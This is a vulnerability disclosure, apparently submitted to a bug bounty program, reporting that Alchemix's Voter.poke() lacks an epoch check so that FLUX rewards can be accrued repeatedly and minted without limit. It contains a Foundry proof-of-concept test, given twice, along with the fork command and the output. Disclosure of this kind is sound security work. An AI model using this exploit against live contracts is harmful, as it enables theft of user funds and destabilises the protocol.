# 30634 - \[SC - Critical] Unauthorized minting of unlimited FLUX in tran...

Submitted on May 2nd 2024 at 16:22:35 UTC by @infosec\_us\_team for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #30634

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

The absence of the `onlyNewEpoch(_tokenId)` modifier in the `poke(uint256 _tokenId)` function of the `Voter.sol` smart contract allows anyone to call `poke(uint256 _tokenId)` multiple times within the same transaction, inflating his accrued FLUX balance.

Finally, the malicious actor calls `FLUX.claimFlux(_tokenId, _amount)` to mint unlimited tokens.

Link to asset: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol?#L195>

To quickly test the exploit add the following foundry test to your existing tests in `alchemix-v2-dao/src/test/FluxToken.t.sol` and run:

```bash
forge test --fork-url https://eth-mainnet.alchemyapi.io/v2/{API_KEY} --match-path src/test/FluxToken.t.sol --match-test testRepeatedFluxAccrual -vv
```

> Replace \*{API\_KEY} \* with your Alchemy Api Key.

Foundry test:

```javascript
    function testRepeatedFluxAccrual() external {

        // Attacker's address
        address attacker = address(0x123);

        // Create a veALCX NFT
        uint256 tokenId = createVeAlcx(attacker, 1e18, veALCX.MAXTIME(), true);
        console2.log("Attacker mints 1 veALCX NFT with tokenId:", tokenId);

        // Attacker's balance before
        uint256 fluxBalance = flux.balanceOf(attacker);
        console2.log("Attacker's fluxBalance:", fluxBalance);

        // Attacker's unclaimed flux before
        uint256 unclaimedFlux = flux.getUnclaimedFlux(tokenId);
        console2.log("Attacker's unclaimedFlux:", unclaimedFlux);

        console2.log("------------------> ATTACK STARTS ");
        console2.log("~ Attacker calls Voter.poke(_tokenId) in a loop to inflate his unclaimed FLUX balance");
        for(uint256 i = 0; i < 4; i++) {
            hevm.prank(attacker);
            voter.poke(tokenId);
        }
        console2.log("------------------> ATTACK ENDS");

        unclaimedFlux = flux.getUnclaimedFlux(tokenId);

        // Claim the unclaimed flux
        hevm.prank(attacker);
        flux.claimFlux(tokenId, unclaimedFlux);

        fluxBalance = flux.balanceOf(attacker);
        console2.log("Attacker's fluxBalance after claiming:", fluxBalance);

    }
```

The output will be:

```bash
Ran 1 test for src/test/FluxToken.t.sol:FluxTokenTest
[PASS] testRepeatedFluxAccrual() (gas: 1369039)
Logs:
  Attacker mints 1 veALCX NFT with tokenId: 1
  Attacker's fluxBalance: 0
  Attacker's unclaimedFlux: 0
  ------------------> ATTACK STARTS
  ~ Attacker calls Voter.poke(_tokenId) in a loop to inflate his unclaimed FLUX balance
  ------------------> ATTACK ENDS
  Attacker's fluxBalance after claiming: 3984666793472586540

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 24.00s (17.11s CPU time)
```

## Vulnerability Details

The internal `_vote(...)` function in the `Vote.sol` contract accrues rewards.

One of the public functions that trigger the accrual inside `_vote(...)` is `poke(...)`, which is missing the `onlyNewEpoch(_tokenId)` modifier that ensures rewards are only accrued once per epoch.

Without this modifier, an attacker can repeatedly call the `poke(...)` function within the same transaction inflating their unclaimed FLUX balance and finally mint the tokens by calling `flux.claimFlux(tokenId, unclaimedFlux)`.

## Impact Details

Minting unlimited FLUX tokens has several (quite evident) impacts. Here's some of them:

1- FLUX is an ERC20, minting unlimited FLUX leads to draining all liquidity in all AMMs where this token is deployed.

2- FLUX is used to **boost a veToken holder's voting power** and **exit a ve-position early**, so minting unlimited FLUX will completely destabilize Alchemix's ecosystem.

## Proof of Concept

To quickly test the exploit add the following foundry test to your existing tests in `alchemix-v2-dao/src/test/FluxToken.t.sol` and run:

```bash
forge test --fork-url https://eth-mainnet.alchemyapi.io/v2/{API_KEY} --match-path src/test/FluxToken.t.sol --match-test testRepeatedFluxAccrual -vv
```

> Replace \*{API\_KEY} \* with your Alchemy Api Key.

Foundry tests:

```javascript
    function testRepeatedFluxAccrual() external {

        // Attacker's address
        address attacker = address(0x123);

        // Create a veALCX NFT
        uint256 tokenId = createVeAlcx(attacker, 1e18, veALCX.MAXTIME(), true);
        console2.log("Attacker mints 1 veALCX NFT with tokenId:", tokenId);

        // Attacker's balance before
        uint256 fluxBalance = flux.balanceOf(attacker);
        console2.log("Attacker's fluxBalance:", fluxBalance);

        // Attacker's unclaimed flux before
        uint256 unclaimedFlux = flux.getUnclaimedFlux(tokenId);
        console2.log("Attacker's unclaimedFlux:", unclaimedFlux);

        console2.log("------------------> ATTACK STARTS ");
        console2.log("~ Attacker calls Voter.poke(_tokenId) in a loop to inflate his unclaimed FLUX balance");
        for(uint256 i = 0; i < 4; i++) {
            hevm.prank(attacker);
            voter.poke(tokenId);
        }
        console2.log("------------------> ATTACK ENDS");

        unclaimedFlux = flux.getUnclaimedFlux(tokenId);

        // Claim the unclaimed flux
        hevm.prank(attacker);
        flux.claimFlux(tokenId, unclaimedFlux);

        fluxBalance = flux.balanceOf(attacker);
        console2.log("Attacker's fluxBalance after claiming:", fluxBalance);

    }
```

The output will be:

```bash
Ran 1 test for src/test/FluxToken.t.sol:FluxTokenTest
[PASS] testRepeatedFluxAccrual() (gas: 1369039)
Logs:
  Attacker mints 1 veALCX NFT with tokenId: 1
  Attacker's fluxBalance: 0
  Attacker's unclaimedFlux: 0
  ------------------> ATTACK STARTS
  ~ Attacker calls Voter.poke(_tokenId) in a loop to inflate his unclaimed FLUX balance
  ------------------> ATTACK ENDS
  Attacker's fluxBalance after claiming: 3984666793472586540

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 24.00s (17.11s CPU time)
```
